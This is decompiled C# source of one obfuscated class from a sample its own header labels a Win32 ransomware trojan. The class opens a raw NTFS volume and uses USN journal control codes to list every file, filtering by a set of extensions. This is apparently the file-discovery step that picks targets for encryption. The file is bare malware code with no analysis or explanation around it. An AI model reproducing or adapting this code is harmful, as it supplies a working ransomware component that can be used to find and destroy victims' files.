// Decompiled with JetBrains decompiler
// Type: NS002.IwzaWmnwcnlB
// Assembly: Worker-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E50A6D0-CF23-40BF-9617-750EB84D00C0
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-122df846a943e419c3a31f65b6e67e7570134612b2dfd45638e0edd23e214036.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace NS002
{
  public sealed class IwzaWmnwcnlB
  {
    [NonSerialized]
    internal static GetString f000047;

    public void CJkuFhqIgKwiFDo(
      string fFXTiHjBuE,
      HashSet<string> p1,
      out Dictionary<ulong, c00001f> p2,
      out Dictionary<ulong, c00001f> p3)
    {
      p3 = new Dictionary<ulong, c00001f>();
      p2 = new Dictionary<ulong, c00001f>();
      IntPtr zero = IntPtr.Zero;
      IntPtr MaoGUCesvuRx = IntPtr.Zero;
      try
      {
        this.YcGZoNUyLA(fFXTiHjBuE, p3);
        this.m000030(fFXTiHjBuE, out MaoGUCesvuRx);
        this.m000031(MaoGUCesvuRx);
        this.KnDjTBGziLmP(ref zero, MaoGUCesvuRx);
        this.vuavHQRmyjQam(zero, ref p2, p1, p3, MaoGUCesvuRx);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message, (object) ex);
        for (Exception innerException = ex.InnerException; innerException != null; innerException = innerException.InnerException)
          Console.WriteLine(innerException.Message, (object) innerException);
        throw new ApplicationException("Error in EnumerateVolume()", ex);
      }
      finally
      {
        if (MaoGUCesvuRx.ToInt32() != -1)
          fowDTntJmGa.CloseHandle(MaoGUCesvuRx);
        if (zero != IntPtr.Zero)
          Marshal.FreeHGlobal(zero);
      }
    }

    private void YcGZoNUyLA(string p0, Dictionary<ulong, c00001f> p1)
    {
      string p0_1 = "\\\\.\\" + p0 + (object) Path.DirectorySeparatorChar;
      IntPtr file = fowDTntJmGa.CreateFile(p0_1, 0U, 3U, IntPtr.Zero, 3U, 33554432U, IntPtr.Zero);
      if (file.ToInt32() == -1)
        return;
      fowDTntJmGa.MwxJKPNSghjaz SlbFxihzWP = new fowDTntJmGa.MwxJKPNSghjaz();
      if (fowDTntJmGa.GetFileInformationByHandle(file, out SlbFxihzWP))
      {
        ulong key = (ulong) SlbFxihzWP.f00005e << 32 | (ulong) SlbFxihzWP.f00005f;
        c00001f c00001f = new c00001f(p0_1, 0UL);
        p1.Add(key, c00001f);
      }
      fowDTntJmGa.CloseHandle(file);
    }

    private void m000030(string p0, out IntPtr MaoGUCesvuRx)
    {
      string p0_1 = "\\\\.\\" + p0;
      MaoGUCesvuRx = fowDTntJmGa.CreateFile(p0_1, 3221225472U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
    }

    private void vuavHQRmyjQam(
      IntPtr p0,
      ref Dictionary<ulong, c00001f> p1,
      HashSet<string> p2,
      Dictionary<ulong, c00001f> p3,
      IntPtr p4)
    {
      IntPtr num = Marshal.AllocHGlobal(65544);
      fowDTntJmGa.ZeroMemory(num, 65544);
      uint JjyBKitWZnnL = 0;
      while (fowDTntJmGa.DeviceIoControl(p4, 590003U, p0, sizeof (fowDTntJmGa.WJTnxMpwzsrxx), num, 65544, out JjyBKitWZnnL, IntPtr.Zero))
      {
        IntPtr p0_1 = new IntPtr(num.ToInt32() + 8);
        fowDTntJmGa.c000029 c000029;
        for (; JjyBKitWZnnL > 60U; JjyBKitWZnnL -= c000029.YzSqECEghWmI)
        {
          c000029 = new fowDTntJmGa.c000029(p0_1);
          if (0 == ((int) c000029.XzwTySWWZu & 16))
          {
            bool flag = true;
            if (p2 != null)
            {
              string extension = Path.GetExtension(c000029.BRNPsBTqGfQj);
              flag = p2.Contains(extension);
            }
            if (flag)
            {
              if (!p1.ContainsKey(c000029.hTwsGlYBhKak))
              {
                p1.Add(c000029.hTwsGlYBhKak, new c00001f(c000029.BRNPsBTqGfQj, c000029.nzELpMuvziofyW));
              }
              else
              {
                c00001f c00001f = p1[c000029.hTwsGlYBhKak];
                if (0 != string.Compare(c000029.BRNPsBTqGfQj, c00001f.Name, true))
                {
                  Console.WriteLine("Attempt to add duplicate file reference number: {0} for file {1}, file from index {2}", (object) c000029.hTwsGlYBhKak, (object) c000029.BRNPsBTqGfQj, (object) c00001f.Name);
                  throw new Exception(string.Format("Duplicate FRN: {0} for {1}", (object) c000029.hTwsGlYBhKak, (object) c000029.BRNPsBTqGfQj));
                }
              }
            }
          }
          else
          {
            if (p3.ContainsKey(c000029.hTwsGlYBhKak))
              throw new Exception(string.Format("Duplicate FRN: {0} for {1}", (object) c000029.hTwsGlYBhKak, (object) c000029.BRNPsBTqGfQj));
            p3.Add(c000029.hTwsGlYBhKak, new c00001f(c000029.BRNPsBTqGfQj, c000029.nzELpMuvziofyW));
          }
          p0_1 = new IntPtr((long) p0_1.ToInt32() + (long) c000029.YzSqECEghWmI);
        }
        Marshal.WriteInt64(p0, Marshal.ReadInt64(num, 0));
      }
      Marshal.FreeHGlobal(num);
    }

    private void m000031(IntPtr p0)
    {
      fowDTntJmGa.iThKKoyFnhi structure;
      structure.f000062 = 8388608UL;
      structure.ycIAFIhfPLuj = 1048576UL;
      int num1 = Marshal.SizeOf<fowDTntJmGa.iThKKoyFnhi>(structure);
      IntPtr num2 = Marshal.AllocHGlobal(num1);
      fowDTntJmGa.ZeroMemory(num2, num1);
      Marshal.StructureToPtr<fowDTntJmGa.iThKKoyFnhi>(structure, num2, true);
      fowDTntJmGa.DeviceIoControl(p0, 590055U, num2, num1, IntPtr.Zero, 0, out uint _, IntPtr.Zero);
    }

    private void KnDjTBGziLmP(ref IntPtr p0, IntPtr p1)
    {
      uint cIbvvAaCds = 0;
      fowDTntJmGa.yiUHJbxbUorDr p4 = new fowDTntJmGa.yiUHJbxbUorDr();
      if (!fowDTntJmGa.DeviceIoControl(p1, 590068U, IntPtr.Zero, 0, out p4, sizeof (fowDTntJmGa.yiUHJbxbUorDr), out cIbvvAaCds, IntPtr.Zero))
        return;
      fowDTntJmGa.WJTnxMpwzsrxx structure;
      structure.f000063 = 0UL;
      structure.f000064 = 0L;
      structure.f000065 = p4.f000061;
      int num = Marshal.SizeOf<fowDTntJmGa.WJTnxMpwzsrxx>(structure);
      p0 = Marshal.AllocHGlobal(num);
      fowDTntJmGa.ZeroMemory(p0, num);
      Marshal.StructureToPtr<fowDTntJmGa.WJTnxMpwzsrxx>(structure, p0, true);
    }

    static IwzaWmnwcnlB() => Strings.CreateGetStringDelegate(typeof (IwzaWmnwcnlB));
  }
}
